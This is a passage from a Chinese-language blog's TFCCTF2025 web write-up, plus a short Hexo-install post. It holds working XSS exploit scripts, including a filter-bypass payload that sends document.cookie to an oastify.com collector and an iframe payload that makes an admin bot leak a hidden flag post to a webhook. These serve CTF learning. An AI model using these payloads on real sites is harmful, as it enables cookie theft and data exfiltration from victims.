<li><code>mapping</code>映射：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;atob&quot;</span>: <span class="string">&quot;at$&#123;&#x27;o&#x27;&#125;b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JAVASCRIPT&quot;</span>: <span class="string">&quot;JAVA$&#123;&#x27;S&#x27;&#125;CRIPT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;=&quot;: &quot;&amp;#61&quot;,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;atob&quot;</span>: <span class="string">&quot;at$&#123;&#x27;o&#x27;&#125;b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JAVASCRIPT&quot;</span>: <span class="string">&quot;JAVA$&#123;&#x27;S&#x27;&#125;CRIPT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;=&quot;: &quot;&amp;#61&quot;,</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sum to remove `l` char in base64</span></span><br><span class="line">js_inner = <span class="string">&quot;  fetch(&#x27;https://m5s9ag1y50zj7a69toy64m&#x27; + &#x27;7l7cd31zxnm.oastify.com/?x=&#x27;+document.cookie) &quot;</span></span><br><span class="line">js_base = base64.b64encode(js_inner.encode()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">js = <span class="string">f&quot;&quot;&quot;Function(atob(`<span class="subst">&#123;js_base&#125;</span>`))()&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(js)</span><br><span class="line"></span><br><span class="line">to_enc = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;SCRIPT&gt;<span class="subst">&#123;js&#125;</span>&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> mapping.keys():</span><br><span class="line">        to_enc = to_enc.replace(key, mapping[key])</span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="comment"># (Blocked chars check)</span></span><br><span class="line"><span class="comment"># Not exploit</span></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">15</span>)</span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;import&quot;</span>,</span><br><span class="line">          <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;JAVASCRIPT&quot;</span>, <span class="string">&quot;window&quot;</span>, <span class="string">&quot;atob&quot;</span>, <span class="string">&quot;btoa&quot;</span>, <span class="string">&quot;=&quot;</span>]</span><br><span class="line"></span><br><span class="line">ban_doesnt_trigger = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> banned:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> to_enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;BAN | <span class="subst">&#123;c&#125;</span> | found&#x27;</span>)</span><br><span class="line">        ban_doesnt_trigger= <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> ban_doesnt_trigger:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All good&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="WEBLESS"><a href="#WEBLESS" class="headerlink" title="WEBLESS"></a>WEBLESS</h3><p><strong>一、题目描述</strong></p>
<p>用户注册登录后，可以创建 Post ，创建好之后可以浏览，也可以通过点击 Report to Admin 触发机器人访问该Post</p>
<style>.njbvrphdcedr{zoom:80%;}</style><img src="/2025/09/28/TFCCTF2025/image-20250902204726339.png" class="njbvrphdcedr" alt="image-20250902204726339">

<p>flag被管理员写在了Post中，只有管理员或者机器人可通过 <code>/post/0</code> 访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ADMIN_USERNAME = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">ADMIN_PASSWORD = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">users = &#123;ADMIN_USERNAME: ADMIN_PASSWORD&#125;</span><br><span class="line">posts = [&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: ADMIN_USERNAME,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;FLAG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>: FLAG,</span><br><span class="line">    <span class="string">&quot;hidden&quot;</span>: <span class="literal">True</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure>

<p>目标是让机器人访问存放flag的页面： <code>post/0</code> ，然后再想办法获取flag</p>
<p><strong>二、题目分析</strong></p>
<p>用户登录之后，可以创建Post</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create_post&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_post</span>():</span><br><span class="line">    title = request.form[<span class="string">&quot;title&quot;</span>]</span><br><span class="line">    description = request.form[<span class="string">&quot;description&quot;</span>]   <span class="comment"># 获取用户输入的 description</span></span><br><span class="line">    hidden = request.form.get(<span class="string">&quot;hidden&quot;</span>) == <span class="string">&quot;on&quot;</span>  <span class="comment"># Checkbox in form for hidden posts</span></span><br><span class="line">    post_id = <span class="built_in">len</span>(posts)</span><br><span class="line">    posts.append(&#123;   // 将用户的该post条目加入posts</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: post_id,</span><br><span class="line">        <span class="string">&quot;author&quot;</span>: session[<span class="string">&quot;username&quot;</span>],   <span class="comment"># author是session[username]</span></span><br><span class="line">        <span class="string">&quot;title&quot;</span>: title,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: description,</span><br><span class="line">        <span class="string">&quot;hidden&quot;</span>: hidden</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>用户可以访问自己创建的笔记</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post/&lt;int:post_id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_page</span>(<span class="params">post_id</span>):</span><br><span class="line">    <span class="comment"># 判断访问的id是否存在</span></span><br><span class="line">    post = <span class="built_in">next</span>((p <span class="keyword">for</span> p <span class="keyword">in</span> posts <span class="keyword">if</span> p[<span class="string">&quot;id&quot;</span>] == post_id), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> post:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Post not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="comment"># 判断用户是否设置可见 且 判断用户是否为作者</span></span><br><span class="line">    <span class="keyword">if</span> post.get(<span class="string">&quot;hidden&quot;</span>) <span class="keyword">and</span> post[<span class="string">&quot;author&quot;</span>] != session[<span class="string">&quot;username&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">403</span></span><br><span class="line">    <span class="comment"># 若id存在 且 用户为作者，将post（包含用户输入title和description）传入render_template函数</span></span><br><span class="line">    resp = make_response(render_template(<span class="string">&quot;post.html&quot;</span>, post=post))</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Security-Policy&quot;</span>] = <span class="string">&quot;script-src &#x27;none&#x27;; style-src &#x27;self&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>

<p>用户访问 <code>/report</code> 页面时会触发机器人访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/report&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>)   <span class="comment"># 获取data部分的url</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Missing url&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="comment"># 创建线程执行 run_admin_bot 函数</span></span><br><span class="line">    Thread(target=_run_admin_bot, args=(url,), daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Report queued&#x27;</span>, <span class="number">202</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_run_admin_bot</span>(<span class="params">target_url: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 将 url 作为参数传递给bot</span></span><br><span class="line">        bot.run_report(target_url, ADMIN_USERNAME, ADMIN_PASSWORD)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[BOT] Done&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[BOT] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>bot <code>report</code>操作实际是以管理员身份登录和访问待 <code>report</code> 的 <code>url</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_report</span>(<span class="params">url, username, password</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        driver = webdriver.Chrome(service=service, options=options)</span><br><span class="line">        <span class="comment"># 1.以管理员身份登录</span></span><br><span class="line">        driver.get(<span class="string">f&quot;http://127.0.0.1:5000/login?username=<span class="subst">&#123;username&#125;</span>&amp;password=<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># Wait until page is loaded (document.readyState == &quot;complete&quot;)</span></span><br><span class="line">        WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">            <span class="keyword">lambda</span> d: d.execute_script(<span class="string">&quot;return document.readyState&quot;</span>) == <span class="string">&quot;complete&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2.访问 report page url</span></span><br><span class="line">        driver.get(url)</span><br><span class="line">        WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">            <span class="keyword">lambda</span> d: d.execute_script(<span class="string">&quot;return window.reportReady === true&quot;</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Report page fully loaded&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>结合 <code>flag</code> 存放在管理员的 <code>post/0</code> 中，突破点在触发机器人执行report，以管理员的身份登录之后去访问某个<code>url</code>，若该<code>url</code>包含恶意链接，使得机器人在访问时将其<code>cookie</code>或者之前访问 <code>post/0</code> 的内容带出来，即可获得<code>flag</code></p>
<p><code>exp</code>如下：</p>
<p>注：<code>credentialless</code> 的核心作用是：让 iframe 请求不带 cookie，适用于跨域信息泄露场景</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">URL = <span class="string">&quot;https://webless-156e7e4ba10d8dc9.challs.tfcctf.com&quot;</span></span><br><span class="line"></span><br><span class="line">solution = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;iframe src=&quot;/post/0&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;iframe credentialless src=&quot;/login?username=&lt;script&gt;fetch(`https://WEBHOOOK/$&#123;btoa(top.window.frames[0].document.body.innerText.substr(20))&#125;`)&lt;/script&gt;&amp;password=a&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">s.post(URL+<span class="string">&quot;/register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>&#125;)</span><br><span class="line">s.post(URL+<span class="string">&quot;/create_post&quot;</span>, data=&#123;<span class="string">&quot;title&quot;</span>: <span class="string">&quot;LEAK&quot;</span>, <span class="string">&quot;description&quot;</span>: solution, <span class="string">&quot;hidden&quot;</span>: <span class="string">&quot;off&quot;</span>&#125;)</span><br><span class="line">s.post(URL+<span class="string">&quot;/report&quot;</span>, data=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:5000/post/1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Check the webhook&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>poyload</code>的解释如下：</p>
<p>用户创建的post中包含solution，</p>
<p>当bot通过<code>&quot;http://127.0.0.1:5000/post/1&quot;</code> 访问时，返回的页面中包含solution；bot首先会访问 <code>src=“post/0”</code> ，然后会访问 <code>src=&quot;/login?username=&lt;script&gt;fetch(......)$&#123;btoa(top.window.frames[0].document.body.innerText.substr(20))&#125;</code></p>
<p>在访问后者时会获取前一帧显示的内容的前20个字符，将通过base64编码后发送到<code>https://WEBHOOOK</code>，即将flag的值发送出来了</p>
<p><img src="/2025/09/28/TFCCTF2025/image-20250902224454450.png" alt="image-20250902224454450"></p>
<h3 id="WEB-DOM"><a href="#WEB-DOM" class="headerlink" title="WEB-DOM"></a>WEB-DOM</h3><p>参考链接：<a target="_blank" rel="noopener" href="https://github.com/Eclso/Eclso.github.io/blob/11bb3cbcd4d305a895efd57c96979b6cc90d6519/_posts/2025-09-1-TFCCTF-DOM-Notify.md">https://github.com/Eclso/Eclso.github.io/blob/11bb3cbcd4d305a895efd57c96979b6cc90d6519/_posts/2025-09-1-TFCCTF-DOM-Notify.md</a></p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/dom-based/dom-clobbering">https://portswigger.net/web-security/dom-based/dom-clobbering</a></p>
<p>server响应配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;name&quot;: &quot;invalid-value&quot;, &quot;observedAttribute&quot;: &quot;aria-label&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/2025/09/28/TFCCTF2025/image-20250910160934444.png" alt="image-20250910160934444"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/09/28/TFCCTF2025/" data-id="cuidX075fnWBRvwCLE5XdvuNu" data-title="TFCCTF2025 web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/17/hello/" class="article-date">
  <time class="dt-published" datetime="2023-11-17T07:08:30.000Z" itemprop="datePublished">2023-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/17/hello/">hello</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="安装git和nodejs"><a href="#安装git和nodejs" class="headerlink" title="安装git和nodejs"></a>安装git和nodejs</h2><p>官方下载地址: <a href="https://link.zhihu.com/?target=https://git-scm.com/download/win">Git - Downloading Package (git-scm.com)</a></p>
<p>官方下载地址: <a href="https://link.zhihu.com/?target=https://nodejs.org/en/">Node.js (nodejs.org)</a></p>
<p>在 cmd 中输入命令 <code>git --version</code>, 查看 Git 版本</p>
<p>在 cmd 中输入命令 <code>node -v</code>, 查看 Node 版本</p>
<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>使用 cnpm 安装 Hexo，先通过 npm install 安装 cnpm。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry==https://registry.npm.taobao.org</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 cmd 中输入命令 cnpm -v, 可查看 cnpm 版本</span></span><br><span class="line">cnpm install -g hexo-cli</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 cmd 中输入命令 hexo -v, 可查看 hexo 版本</span></span><br></pre></td></tr></table></figure>





<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>hjkkgktest</p>
<p><img src="/2023/11/17/hello/wallhaven-rq75r7.jpg" alt="wallhaven-rq75r7"></p>
<p>et2<img src="/2023/11/17/hello/wallhaven-2yg1lg.png" alt="wallhaven-2yg1lg"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/11/17/hello/" data-id="cuidP-WXZQZxDwbRQArr7w28Y" data-title="hello" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/10/10/junior/">junior ctf web</a>
          </li>
        
          <li>
            <a href="/2025/10/08/justCTF2025/">justCTF2025</a>
          </li>
        
          <li>
            <a href="/2025/09/28/TFCCTF2025/">TFCCTF2025 web</a>
          </li>
        
          <li>
            <a href="/2023/11/17/hello/">hello</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>